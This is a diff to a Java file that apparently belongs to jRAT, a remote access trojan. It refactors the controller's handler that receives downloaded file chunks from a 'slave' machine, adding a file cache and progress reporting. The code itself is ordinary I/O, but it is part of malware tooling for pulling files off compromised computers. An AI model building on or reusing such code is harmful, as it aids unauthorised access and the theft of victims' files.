@@ -3,23 +3,15 @@ package se.jrat.client.packets.incoming;
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.FileOutputStream;
-import java.util.HashMap;
-import java.util.Map;
 
-import javax.swing.JOptionPane;
-
-import se.jrat.client.FileData;
 import se.jrat.client.Slave;
-import se.jrat.client.packets.outgoing.Packet21ServerDownloadFile;
 import se.jrat.client.ui.frames.FrameFileTransfer;
 import se.jrat.client.ui.frames.FrameRemoteFiles;
-import se.jrat.common.io.FileIO;
-import se.jrat.common.io.TransferListener;
+import se.jrat.common.io.FileCache;
+import se.jrat.common.io.TransferData;
 
 
 public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
-
-	public static final Map<Slave, FileData> data = new HashMap<Slave, FileData>();
 
 	@Override
 	public void read(final Slave slave, DataInputStream dis) throws Exception {
@@ -32,19 +24,23 @@ public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 			frame2.start();
 		}
 
-		final FileData localData = data.get(slave);
+		TransferData localData = FileCache.get(slave);
 
-		File output = localData.getLocalFile();
+		File output = localData.local;
 
 		if (output.isDirectory()) {
 			output = new File(output, remotePath.substring(remotePath.lastIndexOf(slave.getFileSeparator()) + 1, remotePath.length()));
 		}
 		
+		TransferData data = FileCache.get(slave);
+		
 		byte[] buffer = new byte[dis.readInt()];
 		dis.readFully(buffer);
-		FileOutputStream fos = new FileOutputStream(output, true);
-		fos.write(buffer);
-		fos.close();
+		data.getOutputStream().write(buffer);
+		data.increaseRead(buffer.length);
+		int bytesSent = data.read;
+		int totalBytes = (int) data.total;
+		frame.reportProgress(remotePath, (int) ((float) bytesSent / (float) totalBytes * 100.0F), (int) bytesSent, (int) totalBytes);
 
 		/*try {
 			FileIO fileio = new FileIO();
